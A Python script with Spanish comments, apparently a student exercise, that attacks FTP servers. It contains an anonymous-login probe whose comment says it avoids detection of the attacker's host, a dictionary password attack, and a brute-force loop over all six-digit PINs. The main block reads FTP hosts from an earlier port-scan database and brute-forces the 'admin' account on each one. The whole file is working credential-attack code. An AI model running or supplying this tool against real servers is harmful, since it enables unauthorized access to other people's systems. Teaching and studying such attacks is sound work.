#Importamos librerías necesarias para que el script funcione.
from ftplib import FTP
import mysql.connector as mysql

"""Hacemos la conexión FTP con el usuario anónimo para que no detecten nuestro host
	donde tendremos la variable de conexión, la de usuario, contraseña y una variable auxiliar
	para imprimir dependiendo el resultado"""
def conexionAnonymous(host):
	con = True
	user = "anonymous"
	pasguord = ""
	auxiliar1 = "Hubo un fallo en la conexión FTP."

#Se intenta la conexión. 
	try:
		tp = FTP(host, user, pasguord)
		#Veamos si la conexión FTP se ejecuta correctamente.
		print("Conexión establecida exitosamente.")
		con = False 
		    
	except:
		print(auxiliar1)
		con = True 

	if not con:
		auxiliar1 = "Conexión establecida exitosamente"
		pass
	print ("Dirección IP del servidor: "+ host)
	print ("El usuario "+user+" con contraseña "+pasguord+" con conexión " + str(not con)+" ha sido una "+auxiliar1)

	

def atauserdiccionario(user, host):

	#Se lee el archivo .txt que contiene el diccionario
	auxiliar2 = open("diccionario.txt", "r")
	con = True
	pasguord = ""

	#Ciclo para leer el diccionario
	while(con):

		renglon = auxiliar2.readline()
		auxiliar1 = "Hubo un fallo en la conexión"
		pasguord = renglon [0:(len(renglon)-1)]

		#Intentamos conectarnos por FTP con la password del renglón
		try:
			tp = FTP(host, user, pasguord)
			con = False 
		    

		except:
		    print("Hubo un fallo en la conexión")
		    con = True 

		if not con:
			auxiliar1 = "Conexión establecida exitosamente"
			pass
		print ("El usuario "+user+" con contraseña "+pasguord+" con conexión " + str(not con)+" ha sido una "+auxiliar1)

		if not renglon:
			break 

def atauserfb(user, host):
	con = True
	
	#Ciclo para atacar a los hosts con diferentes contraseñas
	contador = 0 
	while(contador < 1000000):

		#Se hace string el número del contador, rellenando con ceros lo restante del número para tratar del 000000 al 999999
		auxiliar1 = "Hubo un fallo en la conexión"
		pasguord = str(contador).zfill(6)
		print (pasguord)
		
		try:
			tp = FTP(host, user, pasguord)
			con = False 
		except:
		    print("Hubo un fallo en la conexión")
		    con = True 

		if not con:
			auxiliar1 = "Conexión establecida exitosamente"
			pass
		print ("El usuario "+user+" con contraseña "+pasguord+" con conexión " + str(not con)+" ha sido una "+auxiliar1)

		 #Aumentamos el contador para avanzar de línea.
		contador = contador + 1

		#Si no existe la siguiente línea/renglón del .txt, rompemos el ciclo.
		if not con:
			break 

host = "127.0.0.1"
user = "Fernando"

#Recolectamos de la BD los hosts que tienen servicio FTP de la práctica anterior de detección de puertos
con = mysql.connect( host='localhost', user= 'root', passwd='', db='ports' )
operacion = con.cursor()
operacion.execute( "SELECT * FROM schedule WHERE service = 'ftp' ; " )
resultado = operacion.fetchall()

#Se hace el llamo a la función y comienza el ataque a los hosts detectados con servicio FTP
for row in resultado:
    atauserfb("admin",row[0])
